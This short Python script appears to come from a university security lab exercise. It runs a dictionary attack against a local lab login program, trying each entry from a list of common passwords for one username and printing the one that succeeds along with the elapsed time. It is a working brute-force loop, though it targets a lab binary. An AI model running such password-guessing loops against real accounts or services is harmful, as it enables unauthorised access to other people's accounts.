import subprocess
import time

# directory: /home/cse/Lab1/Q1/

f = open("/home/cse/Lab1/Q1/MostCommonPWs")
with open("/home/cse/Lab1/Q1/MostCommonPWs") as f:
  lines = [line.rstrip('\n') for line in f]
f.close()

start = time.time()
print(f'start time: {start - start}')

for i in lines:
  result = subprocess.run(["python3", "Login.pyc", "SkyRedFalcon914",i], capture_output = True, text = True, cwd = "/home/cse/Lab1/Q1/")
  if result.stdout == "Login successful.\n":
    print(result.stdout)
    print(i)
    print(f'end time: {time.time() - start}')